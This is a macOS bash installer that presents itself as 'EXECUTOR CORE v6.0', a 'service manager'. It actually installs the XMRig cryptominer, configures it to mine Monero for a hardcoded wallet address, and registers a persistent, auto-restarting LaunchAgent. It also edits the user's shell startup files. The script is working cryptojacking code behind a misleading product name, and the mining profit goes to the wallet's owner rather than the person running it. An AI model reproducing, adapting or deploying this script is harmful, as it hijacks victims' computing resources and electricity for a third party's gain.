
#!/bin/bash
set -euo pipefail

G='\033[1;32m'
LG='\033[0;92m'
D='\033[2;32m'
R='\033[0m'

BASE="$HOME/.executor"
BIN="$BASE/bin"
LOGDIR="$HOME/.config/xmrig"
AGENTS="$HOME/Library/LaunchAgents"

LABEL="com.user.executor.miner"
PLIST="$AGENTS/$LABEL.plist"
CONTROL="$BIN/executor"

UID_NUM="$(id -u)"

banner() {
    clear 2>/dev/null || true
    echo -e "${G}"
    echo '███████╗██╗  ██╗███████╗ ██████╗'
    echo '██╔════╝╚██╗██╔╝██╔════╝██╔════╝'
    echo '█████╗   ╚███╔╝ █████╗  ██║'
    echo '██╔══╝   ██╔██╗ ██╔══╝  ██║'
    echo '███████╗██╔╝ ██╗███████╗╚██████╗'
    echo '╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝'
    echo -e "${R}"
    echo -e "${LG}       EXECUTOR CORE v6.0${R}"
    echo -e "${D}       MACOS SERVICE MANAGER${R}"
    echo
}

progress() {
    local label="$1"
    local i
    echo -e "\n${LG}[EXECUTOR] $label${R}"
    for ((i=0; i<=25; i++)); do
        printf "\r${G}["
        printf "%${i}s" | tr ' ' '#'
        printf "%$((25-i))s" | tr ' ' '.'
        printf "] %3d%%${R}" "$((i*4))"
        sleep 0.02
    done
    echo
}

banner
mkdir -p "$BIN" "$LOGDIR" "$AGENTS"

progress "INITIALIZING EXECUTOR"

# Locate Homebrew
if command -v brew >/dev/null 2>&1; then
    BREW="$(command -v brew)"
elif [ -x /opt/homebrew/bin/brew ]; then
    BREW=/opt/homebrew/bin/brew
elif [ -x /usr/local/bin/brew ]; then
    BREW=/usr/local/bin/brew
else
    echo -e "${G}[ERROR] Homebrew is not installed.${R}"
    echo "Install Homebrew from https://brew.sh and run this installer again."
    exit 1
fi

eval "$("$BREW" shellenv)"

export HOMEBREW_NO_AUTO_UPDATE=1
export HOMEBREW_NO_INSTALL_CLEANUP=1

progress "CHECKING HOMEBREW"

# Install or repair XMRig
if ! "$BREW" list --versions xmrig >/dev/null 2>&1; then
    echo -e "${LG}[+] Installing XMRig...${R}"
    "$BREW" install xmrig
else
    echo -e "${LG}[OK] Homebrew package detected.${R}"
fi

# Find the actual executable
find_xmrig() {
    local prefix
    prefix="$("$BREW" --prefix xmrig 2>/dev/null || true)"

    if [ -n "$prefix" ] && [ -d "$prefix" ]; then
        find -L "$prefix" -type f -name xmrig -print -quit 2>/dev/null || true
    fi
}

XMRIG="$(find_xmrig)"

# Repair if package exists but executable is missing
if [ -z "$XMRIG" ] || [ ! -x "$XMRIG" ]; then
    echo -e "${LG}[+] Repairing XMRig installation...${R}"
    "$BREW" reinstall xmrig
    XMRIG="$(find_xmrig)"
fi

if [ -z "$XMRIG" ] || [ ! -x "$XMRIG" ]; then
    echo -e "${G}[ERROR] XMRig executable could not be located.${R}"
    echo "Check the Homebrew installation before retrying."
    exit 1
fi

echo -e "${LG}[OK] XMRig found: $XMRIG${R}"

progress "PREPARING CONFIGURATION"

CONFIG="$LOGDIR/config.json"
LOG="$LOGDIR/executor.log"
ERRLOG="$LOGDIR/executor-error.log"

cat > "$CONFIG" <<'CONFIG_JSON'
{
  "autosave": false,
  "donate-level": 1,
  "pools": [
    {
      "coin": "monero",
      "url": "pool.hashvault.pro:443",
      "user": "43qUaFUkE2KB4qLHALW6H5bPWPSdnn7F4GCzEVyX7CbZCtEmjycx8z2d7ts63ekU7HNXFgsrWgYJkauXXwtcFSXx5cUYF6E",
      "pass": "macbook-worker",
      "tls": true,
      "keepalive": true,
      "enabled": true
    }
  ]
}
CONFIG_JSON

chmod 600 "$CONFIG"

progress "CREATING CONTROL UTILITY"

cat > "$CONTROL" <<'CONTROL_SCRIPT'
#!/bin/bash
set -euo pipefail

LABEL="com.user.executor.miner"
UID_NUM="$(id -u)"
DOMAIN="gui/$UID_NUM/$LABEL"

PLIST="$HOME/Library/LaunchAgents/$LABEL.plist"
LOG="$HOME/.config/xmrig/executor.log"
ERRLOG="$HOME/.config/xmrig/executor-error.log"

case "${1:-status}" in

    start)
        if launchctl print "$DOMAIN" >/dev/null 2>&1; then
            echo "[EXECUTOR] Service is already loaded."
            launchctl kickstart "$DOMAIN"
        else
            launchctl bootstrap "gui/$UID_NUM" "$PLIST"
            echo "[EXECUTOR] Service started."
        fi
        ;;

    stop)
        launchctl bootout "$DOMAIN" 2>/dev/null || true
        pkill -TERM -x xmrig 2>/dev/null || true
        echo "[EXECUTOR] Service stopped."
        ;;

    restart)
        if launchctl print "$DOMAIN" >/dev/null 2>&1; then
            launchctl kickstart -k "$DOMAIN"
        else
            launchctl bootstrap "gui/$UID_NUM" "$PLIST"
        fi
        echo "[EXECUTOR] Restart requested."
        ;;

    status)
        echo
        echo "========== EXECUTOR STATUS =========="

        if launchctl print "$DOMAIN" >/dev/null 2>&1; then
            echo "[EXECUTOR] LaunchAgent loaded."
        else
            echo "[EXECUTOR] LaunchAgent not loaded."
        fi

        echo
        pgrep -fl xmrig || echo "No XMRig process found."
        ;;

    logs)
        touch "$LOG" "$ERRLOG"
        tail -n 50 -f "$LOG" "$ERRLOG"
        ;;

    uninstall)
        launchctl bootout "$DOMAIN" 2>/dev/null || true
        pkill -TERM -x xmrig 2>/dev/null || true
        rm -f "$PLIST"
        echo "[EXECUTOR] Service registration removed."
        echo "[EXECUTOR] XMRig and configuration retained."
        ;;

    *)
        echo "EXECUTOR CORE v6.0"
        echo
        echo "Usage:"
        echo "  executor start"
        echo "  executor stop"
        echo "  executor restart"
        echo "  executor status"
        echo "  executor logs"
        echo "  executor uninstall"
        exit 1
        ;;
esac
CONTROL_SCRIPT

chmod 755 "$CONTROL"

progress "REGISTERING MACOS SERVICE"

cat > "$PLIST" <<PLIST_XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LABEL</string>

    <key>ProgramArguments</key>
    <array>
        <string>$XMRIG</string>
        <string>--config=$CONFIG</string>
        <string>--threads=2</string>
        <string>--cpu-priority=1</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>ThrottleInterval</key>
    <integer>10</integer>

    <key>StandardOutPath</key>
    <string>$LOG</string>

    <key>StandardErrorPath</key>
    <string>$ERRLOG</string>
</dict>
</plist>
PLIST_XML

chmod 600 "$PLIST"

plutil -lint "$PLIST"

progress "ADDING EXECUTOR TO SHELL PATH"

for RC in "$HOME/.zshrc" "$HOME/.bashrc"; do
    touch "$RC"
    if ! grep -Fq '.executor/bin' "$RC"; then
        printf '\nexport PATH="$HOME/.executor/bin:$PATH"\n' >> "$RC"
    fi
done

export PATH="$BIN:$PATH"

progress "STARTING EXECUTOR SERVICE"

launchctl bootout "gui/$UID_NUM/$LABEL" 2>/dev/null || true
launchctl bootstrap "gui/$UID_NUM" "$PLIST"

echo
echo -e "${G}==========================================${R}"
echo -e "${LG}       EXECUTOR CORE v6.0${R}"
echo -e "${LG}       INSTALLATION COMPLETE${R}"
echo -e "${G}==========================================${R}"
echo
echo "XMRig:     $XMRIG"
echo "Config:    $CONFIG"
echo "Service:   $LABEL"
echo "Control:   $CONTROL"
echo "Logs:      $LOG"
echo
echo "Commands:"
echo "  executor start"
echo "  executor stop"
echo "  executor restart"
echo "  executor status"
echo "  executor logs"
echo "  executor uninstall"
echo
echo "Open a new Terminal window or run:"
echo "  source ~/.zshrc"
echo
echo -e "${LG}EXECUTOR INITIALIZATION FINISHED${R}"
